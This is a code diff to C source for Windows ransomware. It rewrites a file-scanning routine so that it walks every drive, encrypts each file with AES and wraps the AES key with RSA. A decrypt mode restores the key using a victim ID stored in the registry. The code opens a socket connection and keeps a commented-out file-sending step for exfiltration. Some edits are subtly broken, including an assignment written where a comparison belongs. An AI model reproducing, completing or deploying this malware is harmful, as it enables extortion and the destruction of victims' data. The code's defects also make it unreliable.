@@ -1,7 +1,10 @@
+#include "file_scan.h"
+
 #include <stdio.h>
 #include <windows.h>
 #include <wincrypt.h>
 #include <string.h>
+#include <stdbool.h>
 #include "crypto.h"
 #include "file_steal.h"
 #pragma comment(lib, "advapi32.lib")
@@ -9,12 +12,12 @@
 char queue[8192][260];
 
 
-int main() {
+void FileScan(bool decryptMode) {
     SOCKET socket;
     struct sockaddr_in socket_addr;
 
     HCRYPTPROV hProv;
-    HCRYPTKEY hKey;
+    HCRYPTKEY hAesKey, hRsaKey;
     BYTE *keyBlob;
     BYTE *ivBlob;
 
@@ -28,24 +31,44 @@ int main() {
     unsigned char *buffer;
     HANDLE hFind = INVALID_HANDLE_VALUE;
     DWORD result = GetLogicalDriveStringsA(sizeof(drives), drives);
-    if (result == 0) {
+    if (result = 0) {
         printf("[!] Can't get drivers.");
-        return 1;
+        return;
     }
     char* drive = drives;
     ConnectionEstablish(&socket, &socket_addr);
-    InitializeSymmetricCrypto(&hProv, &hKey, &keyBlob);
+    InitializeCrypto(&hProv, &hAesKey, &hRsaKey, &keyBlob);
 
-    // FileSend("C:\\Users\\Admin\\Documents\\ransomware\\test\\passwd.txt", 3213310, socket);
-    
-    // FileEncrypt("C:\\Users\\Admin\\Documents\\ransomware\\test\\passwd.txt", hProv, hKey);
-    // char key[33];
-    // scanf("%s", key);
-    // hKey = ImportKey(key, hProv);
-    // FileDecrypt("C:\\Users\\Admin\\Documents\\ransomware\\test\\passwd.txt.enc", hProv, hKey);
+    if (decryptMode) {
+        DWORD idLen = 0;
+        BYTE *id = LoadFromRegistry("id", &idLen);
+        char *hexStr = (char*)malloc(idLen * 2 + 1);
+        for (DWORD i = 0; i < idLen; i++) {
+            sprintf(hexStr + (i * 2), "%02x", id[i]);
+        }
+        hexStr[idLen * 2] = '\0';
+        printf("ID: %s\n", hexStr);
+        char* privateKey = GetRSAKey((char*)hexStr);
+        free(hexStr);
+        free(id);
+        hRsaKey = ImportRSAPrivateKey(privateKey, hProv);
+        DWORD encryptedKeyLen = 256;
+        BYTE *aesKeyBytes = LoadFromRegistry("EncryptedKey", &encryptedKeyLen);
+        KeyDecrypt(&aesKeyBytes, hRsaKey);
+        CryptDestroyKey(hAesKey);
+        hAesKey = ImportAESKeyFromBlob(aesKeyBytes, 28, hProv);
+        printf("Decrypt mode\n");
+    } else {
+        char* publicKey = GetRSAKey(NULL);
+        hRsaKey = ImportRSAPublicKey(publicKey, hProv);
+        printf("Public RSA key: %s\n", publicKey);
+    }
 
     while (*drive != '\0') {
         printf("%s\n", drive);
+        while (strcmp(drive, "F:\\") != 0) {
+            drive += strlen(drive) + 1;
+        }
         strcpy(queue[tail], drive);
         tail = (tail + 1) % 8192;
         while (tail != head) {
@@ -68,14 +91,18 @@ int main() {
                             continue;
                         }
                         sprintf(path, "%s%s\\", currentParentPath, ffd.cFileName);
-                        printf("[DIR]  %s\n", path);
+                        // printf("[DIR]  %s\n", path);
                         strcpy(queue[tail], path);
                         tail = (tail + 1) % 8192;
                     } else {
                         sprintf(path, "%s%s", currentParentPath, ffd.cFileName);
                         long long fileSize = ((long long)ffd.nFileSizeHigh << 32 | ffd.nFileSizeLow);
-                        // FileSend()
-                        // EncryptFile()
+                        if (decryptMode) {
+                            FileDecrypt(path, hProv, hAesKey);
+                        } else {
+                            // FileSend(path, fileSize, socket);
+                            FileEncrypt(path, hProv, hAesKey);
+                        }
                         printf("[FILE] %s - %ld bytes\n", path, fileSize);
                     }
                 } while (FindNextFile(hFind, &ffd) != 0);
@@ -85,9 +112,12 @@ int main() {
         head = tail = 0;
         drive += strlen(drive) + 1;
     }
-    
-    FinalizeSymmetricCrypto(&hProv, &hKey, &keyBlob);
+    if (!decryptMode) {
+        KeyEncrypt(&keyBlob, hRsaKey);
+    } else {
+        printf("Decrypt file successfully!\n");
+    }
+    FinalizeCrypto(&hProv, &hAesKey, &hRsaKey, &keyBlob);
     ConnectionClose(&socket);
     getchar();
-    return 0;
 }
